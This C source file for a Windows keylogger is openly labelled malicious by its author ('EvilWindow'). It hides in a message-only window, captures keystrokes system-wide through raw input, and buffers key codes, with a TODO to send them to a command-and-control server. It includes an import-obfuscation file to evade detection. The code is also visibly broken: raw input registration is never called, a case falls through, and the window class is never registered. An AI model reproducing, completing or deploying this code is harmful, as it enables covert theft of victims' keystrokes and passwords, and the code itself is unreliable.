#include <Windows.h>
#include "IATfuscation.c"

#define KEYCODEBUFFER_SIZE 1024 // Constant for maximum size of the vkCode buffer

// We will store vkCodes into an array and send it away when it's full. Simple, shouldn't generate too much traffic
UINT KeyCodes[KEYCODEBUFFER_SIZE] = { 0 };
SIZE_T Index = 0;

const char WindowClassName[] = "EvilWindow"; // Because I'm an evil bastard! >:D

// Window procedure of our message-only window
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static HANDLE hLog;
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT* buffer;

    switch (msg)
    {
    case WM_CREATE:
        // Register a raw input device to capture keyboard input
        rid.usUsagePage = 0x01;
        rid.usUsage = 0x06;
        rid.dwFlags = RIDEV_INPUTSINK;
        rid.hwndTarget = hwnd;

    case WM_INPUT:
        // request size of the raw input buffer to dwSize
        GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
            sizeof(RAWINPUTHEADER));

        // allocate buffer for input data
        buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
            sizeof(RAWINPUTHEADER)))
        {
            // if this is keyboard message and WM_KEYDOWN, log the key
            if (buffer->header.dwType == RIM_TYPEKEYBOARD && buffer->data.keyboard.Message == WM_KEYDOWN)
            {   
                // Check if the array has space for another key
                if (Index < KEYCODEBUFFER_SIZE)
                {
                    KeyCodes[Index] = buffer->data.keyboard.VKey;
                    Index++;
                }
                else
                {
                    // TO-DO: Reset the buffer and send the data to C2
                }
            }
        }

        // free the buffer
        HeapFree(GetProcessHeap(), 0, buffer);
        break;

    case WM_DESTROY:
        // Change the RAWINPUTDEVICE structure in order to remove the device
        rid.dwFlags = RIDEV_REMOVE; // Remove the device flag
        rid.hwndTarget = NULL; // No longer interested in messages from the device

        // Call RegisterRawInputDevices to unregister the device
        BOOL result = RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));

        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    WNDCLASSEX wc;
    HWND hwnd;
    MSG msg;

    // register window class
    ZeroMemory(&wc, sizeof(WNDCLASSEX));
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = WindowClassName;

    // create message-only window
    hwnd = CreateWindowEx(
        0,
        WindowClassName,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE, NULL, hInstance, NULL
    );

    // the message loop
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return msg.wParam;
}
